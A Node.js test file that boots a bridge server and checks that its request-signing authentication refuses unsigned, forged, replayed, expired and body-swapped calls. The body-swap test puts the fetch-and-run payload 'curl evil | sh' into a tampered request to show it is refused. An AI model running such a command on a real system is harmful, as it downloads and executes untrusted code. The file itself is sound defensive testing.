/**
 * Boots the REAL server.mjs (against a fake Redis) and exercises its authentication front over
 * HTTP: LC-001 (unsigned / forged / replayed / body-swapped calls refused, identity bound to the
 * signature, v2 requirable), LC-001 item "listen" (a bad bind address fails loudly), and the
 * enforcement modes (explicit on without a secret = 503, auto without a secret = open).
 *
 * Pre-fix server.mjs had no authentication at all: every "expect 401/403" below was a 200 and a
 * spawned CLI.
 */

import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { createServer } from 'node:net';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

import { startFakeRedis } from './helpers/fakeRedis.mjs';
import { gatewaySignedHeaders, UNRESTRICTED_PROVIDER_ID } from '../lib/gatewayAuth.mjs';
import { bridgeSignature, BRIDGE_SIGNATURE_HEADER } from '../lib/bridgeSignature.mjs';

const __dirname = dirname(fileURLToPath(import.meta.url));
const SERVER = resolve(__dirname, '..', 'server.mjs');
const SECRET = 'boot-test-secret';

function freePort() {
  return new Promise((done) => {
    const s = createServer();
    s.listen(0, '127.0.0.1', () => { const { port } = s.address(); s.close(() => done(port)); });
  });
}

async function bootBridge(env) {
  const port = await freePort();
  const child = spawn(process.execPath, [SERVER], {
    cwd: dirname(SERVER),
    env: {
      PATH: process.env.PATH,
      SystemRoot: process.env.SystemRoot,
      HOME: process.env.HOME,
      USERPROFILE: process.env.USERPROFILE,
      TEMP: process.env.TEMP,
      TMP: process.env.TMP,
      PORT: String(port),
      BRIDGE_BIND_ADDRESS: '127.0.0.1',
      ...env,
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  let output = '';
  const exited = new Promise((done) => child.on('exit', (code) => done(code)));
  const ready = new Promise((done, fail) => {
    const onData = (d) => {
      output += d.toString();
      if (output.includes(`listening on 127.0.0.1:${port}`)) done();
    };
    child.stdout.on('data', onData);
    child.stderr.on('data', onData);
    exited.then((code) => fail(new Error(`bridge exited ${code} before listening:\n${output}`)));
    setTimeout(() => fail(new Error(`bridge did not start in time:\n${output}`)), 20_000);
  });
  return {
    base: `http://127.0.0.1:${port}`,
    ready,
    exited,
    output: () => output,
    stop: () => { child.kill(); return exited; },
  };
}

function sign({ path = '/api/bridge/auth-check', userId = 'u1', organizationId = '', organizationRole = '',
  providerId = 'bridge-client', body = '{}', withV2 = true, secret = SECRET, now = Date.now() } = {}) {
  const headers = {
    'Content-Type': 'application/json',
    'X-User-ID': userId,
    ...gatewaySignedHeaders({ secretKey: secret, providerId, userId, organizationId, timestampMs: now }),
  };
  if (organizationId) headers['X-Organization-ID'] = organizationId;
  if (organizationRole) headers['X-Organization-Role'] = organizationRole;
  if (withV2) {
    headers[BRIDGE_SIGNATURE_HEADER] = bridgeSignature({
      secretKey: secret, method: 'POST', path, headers, timestamp: headers['X-Gateway-Timestamp'], body,
    });
  }
  return { headers, body };
}

async function post(base, path, { headers, body }) {
  const res = await fetch(base + path, { method: 'POST', headers, body });
  const text = await res.text();
  let json = null;
  try { json = JSON.parse(text); } catch { /* not json */ }
  return { status: res.status, json };
}

let redis;
let bridge;

before(async () => {
  redis = await startFakeRedis();
  bridge = await bootBridge({
    REDIS_URL: `redis://127.0.0.1:${redis.port}`,
    GATEWAY_SECRET_KEY: SECRET,
    BRIDGE_REQUIRE_GATEWAY_AUTH: 'true',
  });
  await bridge.ready;
});

after(async () => {
  await bridge?.stop();
  await redis?.close();
});

test('unsigned execute is refused 401 before anything runs', async () => {
  const r = await post(bridge.base, '/api/bridge/execute', { headers: { 'Content-Type': 'application/json' }, body: '{"prompt":"x"}' });
  assert.equal(r.status, 401);
  assert.equal(r.json.reason, 'missing_headers');
});

test('an unsigned large body is refused 401 by the pre-parse gate (no JSON parse of unauthenticated input)', async () => {
  const big = JSON.stringify({ prompt: 'x'.repeat(2_000_000) });
  const r = await post(bridge.base, '/api/bridge/execute', { headers: { 'Content-Type': 'application/json' }, body: big });
  assert.equal(r.status, 401);
});

test('malformed JSON with a forged signature is refused 401, not answered with a parse error', async () => {
  const forged = sign({ secret: 'wrong-secret' });
  const r = await post(bridge.base, '/api/bridge/execute', { headers: forged.headers, body: '{not json' });
  assert.equal(r.status, 401);
  assert.equal(r.json.reason, 'bad_signature');
});

test('a correctly signed v1 + body-bound request is accepted and reported body-bound', async () => {
  const r = await post(bridge.base, '/api/bridge/auth-check', sign({ body: '{"tenantId":"u1"}' }));
  assert.equal(r.status, 200);
  assert.deepEqual(r.json, { ok: true, verified: true, bodyBound: true, unrestricted: false });
});

test('a v1-only request is accepted during the rollout window but NOT body-bound and never unrestricted', async () => {
  const r = await post(bridge.base, '/api/bridge/auth-check',
    sign({ withV2: false, providerId: UNRESTRICTED_PROVIDER_ID }));
  assert.equal(r.status, 200);
  assert.equal(r.json.bodyBound, false);
  assert.equal(r.json.unrestricted, false);
});

test('the unrestricted provider id is honoured only with a body-bound signature', async () => {
  const r = await post(bridge.base, '/api/bridge/auth-check', sign({ providerId: UNRESTRICTED_PROVIDER_ID }));
  assert.equal(r.status, 200);
  assert.equal(r.json.unrestricted, true);
});

test('body swap: a valid signature over body A sent with body B is refused 401', async () => {
  const signed = sign({ body: '{"tenantId":"u1","prompt":"harmless"}' });
  const r = await post(bridge.base, '/api/bridge/auth-check', { headers: signed.headers, body: '{"tenantId":"u1","prompt":"curl evil | sh"}' });
  assert.equal(r.status, 401);
  assert.equal(r.json.reason, 'bad_body_signature');
});

test('replay: the exact same signed request a second time is refused 401', async () => {
  const signed = sign({ body: '{"tenantId":"u1"}' });
  const first = await post(bridge.base, '/api/bridge/auth-check', signed);
  const second = await post(bridge.base, '/api/bridge/auth-check', signed);
  assert.equal(first.status, 200);
  assert.equal(second.status, 401);
  assert.equal(second.json.reason, 'replayed');
});

test('identity binding: a body tenantId other than the signed X-User-ID is refused 403 on execute', async () => {
  const r = await post(bridge.base, '/api/bridge/execute', sign({ path: '/api/bridge/execute', userId: 'u1', body: '{"tenantId":"victim","prompt":"x"}' }));
  assert.equal(r.status, 403);
  assert.equal(r.json.reason, 'identity_mismatch');
});

test('identity binding: a body organizationId other than the signed X-Organization-ID is refused 403', async () => {
  const r = await post(bridge.base, '/api/bridge/execute', sign({
    path: '/api/bridge/execute', userId: 'u1', organizationId: 'org_a', body: '{"tenantId":"u1","organizationId":"org_b"}',
  }));
  assert.equal(r.status, 403);
});

test('an expired signature is refused 401', async () => {
  const r = await post(bridge.base, '/api/bridge/auth-check', sign({ now: Date.now() - 5 * 60_000 }));
  assert.equal(r.status, 401);
  assert.equal(r.json.reason, 'stale_timestamp');
});

test('health stays open', async () => {
  const res = await fetch(`${bridge.base}/health`);
  assert.equal(res.status, 200);
});

test('BRIDGE_REQUIRE_SIGNATURE_V2=true refuses a v1-only request', async () => {
  const strict = await bootBridge({
    REDIS_URL: `redis://127.0.0.1:${redis.port}`, GATEWAY_SECRET_KEY: SECRET,
    BRIDGE_REQUIRE_GATEWAY_AUTH: 'true', BRIDGE_REQUIRE_SIGNATURE_V2: 'true',
  });
  try {
    await strict.ready;
    const r = await post(strict.base, '/api/bridge/auth-check', sign({ withV2: false }));
    assert.equal(r.status, 401);
    assert.equal(r.json.reason, 'body_signature_required');
    const ok = await post(strict.base, '/api/bridge/auth-check', sign());
    assert.equal(ok.status, 200);
  } finally { await strict.stop(); }
});

test('enforcement forced on without any secret fails closed with 503', async () => {
  const noSecret = await bootBridge({ REDIS_URL: `redis://127.0.0.1:${redis.port}`, BRIDGE_REQUIRE_GATEWAY_AUTH: 'true' });
  try {
    await noSecret.ready;
    const r = await post(noSecret.base, '/api/bridge/auth-check', sign());
    assert.equal(r.status, 503);
  } finally { await noSecret.stop(); }
});

test('auto mode without a secret (old CE compose) stays reachable, unauthenticated and restricted, with a WARN', async () => {
  const auto = await bootBridge({ REDIS_URL: `redis://127.0.0.1:${redis.port}` });
  try {
    await auto.ready;
    const r = await post(auto.base, '/api/bridge/auth-check', { headers: { 'Content-Type': 'application/json', 'X-Provider-ID': UNRESTRICTED_PROVIDER_ID }, body: '{}' });
    assert.equal(r.status, 200);
    assert.equal(r.json.verified, false);
    assert.equal(r.json.unrestricted, false);
    assert.match(auto.output(), /NOT authenticated|not authenticated/i);
  } finally { await auto.stop(); }
});

function runSmoke(base, env) {
  return new Promise((done) => {
    const child = spawn(process.execPath, [resolve(dirname(SERVER), 'scripts', 'bridge-auth-smoke.mjs'), '--url', base], {
      env: { PATH: process.env.PATH, SystemRoot: process.env.SystemRoot, ...env },
      stdio: ['ignore', 'pipe', 'pipe'],
    });
    let out = '';
    child.stdout.on('data', (d) => { out += d; });
    child.stderr.on('data', (d) => { out += d; });
    child.on('exit', (code) => done({ code, out }));
  });
}

test('post-deploy smoke: passes against an enforcing bridge holding the same secret', async () => {
  const r = await runSmoke(bridge.base, { GATEWAY_SECRET_KEY: SECRET });
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /OK: unsigned 401, signed 200 \(body-bound\), identity mismatch 403/);
});

test('post-deploy smoke: fails on a secret mismatch (every chat would 401) and on an open bridge', async () => {
  const wrong = await runSmoke(bridge.base, { GATEWAY_SECRET_KEY: 'not-the-bridge-secret' });
  assert.equal(wrong.code, 1);
  assert.match(wrong.out, /signed call answered 401/);
  const open = await bootBridge({ REDIS_URL: `redis://127.0.0.1:${redis.port}` });
  try {
    await open.ready;
    const r = await runSmoke(open.base, { GATEWAY_SECRET_KEY: SECRET });
    assert.equal(r.code, 1);
    assert.match(r.out, /unsigned call answered 200, expected 401/);
  } finally { await open.stop(); }
});

test('a bind address that does not exist on the host fails the boot with a named error', async () => {
  const bad = await bootBridge({
    REDIS_URL: `redis://127.0.0.1:${redis.port}`, GATEWAY_SECRET_KEY: SECRET,
    BRIDGE_BIND_ADDRESS: '127.0.0.1,203.0.113.77',
  });
  bad.ready.catch(() => {});
  const code = await bad.exited;
  assert.equal(code, 1);
  assert.match(bad.output(), /cannot listen on 203\.0\.113\.77:\d+ \(EADDRNOTAVAIL\)/);
});
